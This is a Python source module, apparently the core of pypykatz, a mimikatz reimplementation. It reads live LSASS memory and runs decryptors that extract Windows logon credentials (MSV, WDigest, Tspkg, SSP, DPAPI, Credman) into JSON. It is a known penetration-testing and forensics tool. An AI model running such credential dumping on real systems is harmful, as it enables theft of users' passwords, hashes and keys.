#!/usr/bin/env python3
#
# Author:
#  Tamas Jos (@skelsec)
#

import json
import logging

from .commons.common import KatzSystemInfo
from .commons.readers.local.live_reader import LiveReader
from .lsadecryptor import CredmanTemplate, MsvTemplate, \
	MsvDecryptor, WdigestTemplate, LsaTemplate, WdigestDecryptor, \
	LiveSspTemplate, LiveSspDecryptor, SspDecryptor, SspTemplate, \
	TspkgDecryptor, TspkgTemplate, \
	DpapiTemplate, DpapiDecryptor, LsaDecryptor


class pypykatz:
	def __init__(self, reader, sysinfo, logger=None):
		self.reader = reader
		self.sysinfo = sysinfo
		self.credentials = []
		self.architecture = None
		self.operating_system = None
		self.buildnumber = None
		self.lsa_decryptor = None
		self.logon_sessions = []
		self.orphaned_creds = []
		
		self.logger = logger if logger else logging.getLogger('pypykatz')
		
	def to_dict(self):
		t = {}
		t['logon_sessions'] = {}
		for ls in self.logon_sessions:
			t['logon_sessions'][ls] = (self.logon_sessions[ls].to_dict())
		t['orphaned_creds'] = []
		for oc in self.orphaned_creds:
			t['orphaned_creds'].append(oc.to_dict())
		return t
		
	def to_json(self):
		return json.dumps(self.to_dict())
		
	@staticmethod
	def go_live():
		reader = LiveReader()
		sysinfo = KatzSystemInfo.from_live_reader(reader)
		mimi = pypykatz(reader.get_buffered_reader(), sysinfo)
		mimi.start()
		return mimi
	
	def log_basic_info(self):
		"""
		In case of error, please attach this to the issues page
		"""
		self.logger.debug('===== BASIC INFO. SUBMIT THIS IF THERE IS AN ISSUE =====')
		self.logger.debug('CPU arch: %s' % self.sysinfo.architecture.name)
		self.logger.debug('OS: %s' % self.sysinfo.operating_system)
		self.logger.debug('BuildNumber: %s' % self.sysinfo.buildnumber)
		self.logger.debug('MajorVersion: %s ' % self.sysinfo.major_version)
		self.logger.debug('MSV timestamp: %s' % self.sysinfo.msv_dll_timestamp)
		self.logger.debug('===== BASIC INFO END =====')
		
	def get_logoncreds(self):
		credman_template = CredmanTemplate.get_template(self.sysinfo)
		msv_template = MsvTemplate.get_template(self.sysinfo)
		logoncred_decryptor = MsvDecryptor(self.reader, msv_template, self.lsa_decryptor, credman_template, self.sysinfo)
		logoncred_decryptor.start()
		self.logon_sessions = logoncred_decryptor.logon_sessions
	
	def get_lsa(self):
		lsa_dec_template = LsaTemplate.get_template(self.sysinfo)
		lsa_dec = LsaDecryptor(self.reader, lsa_dec_template, self.sysinfo)
		# self.logger.debug(lsa_dec.dump())
		return lsa_dec
	
	def get_wdigest(self):
		decryptor_template = WdigestTemplate.get_template(self.sysinfo)
		decryptor = WdigestDecryptor(self.reader, decryptor_template, self.lsa_decryptor, self.sysinfo)
		decryptor.start()
		for cred in decryptor.credentials:
			if cred.luid in self.logon_sessions:
				self.logon_sessions[cred.luid].wdigest_creds.append(cred)
			else:
				self.orphaned_creds.append(cred)
	
	def get_tspkg(self):
		tspkg_dec_template = TspkgTemplate.get_template(self.sysinfo)
		tspkg_dec = TspkgDecryptor(self.reader,tspkg_dec_template, self.lsa_decryptor, self.sysinfo)
		tspkg_dec.start()
		for cred in tspkg_dec.credentials:
			if cred.luid in self.logon_sessions:
				self.logon_sessions[cred.luid].tspkg_creds.append(cred)
			else:
				self.orphaned_creds.append(cred)
				
	def get_ssp(self):
		dec_template = SspTemplate.get_template(self.sysinfo)
		dec = SspDecryptor(self.reader, dec_template, self.lsa_decryptor, self.sysinfo)
		dec.start()
		for cred in dec.credentials:
			if cred.luid in self.logon_sessions:
				self.logon_sessions[cred.luid].ssp_creds.append(cred)
			else:
				self.orphaned_creds.append(cred)
				
	def get_livessp(self):
		livessp_dec_template = LiveSspTemplate.get_template(self.sysinfo)
		livessp_dec = LiveSspDecryptor(self.reader, livessp_dec_template, self.lsa_decryptor, self.sysinfo)
		livessp_dec.start()
		for cred in livessp_dec.credentials:
			if cred.luid in self.logon_sessions:
				self.logon_sessions[cred.luid].livessp_creds.append(cred)
			else:
				self.orphaned_creds.append(cred)
				
	def get_dpapi(self):
		dec_template = DpapiTemplate.get_template(self.sysinfo)
		dec = DpapiDecryptor(self.reader, dec_template, self.lsa_decryptor, self.sysinfo)
		dec.start()
		for cred in dec.credentials:
			if cred.luid in self.logon_sessions:
				self.logon_sessions[cred.luid].dpapi_creds.append(cred)
			else:
				self.orphaned_creds.append(cred)
	
	def start(self):
		# self.log_basic_info()
		self.lsa_decryptor = self.get_lsa()
		for cb in (
			self.get_logoncreds, self.get_wdigest,
			self.get_tspkg, self.get_ssp,
				self.get_livessp, self.get_dpapi):
			try:
				cb()
			except Exception as e:
				self.logger.exception(e)
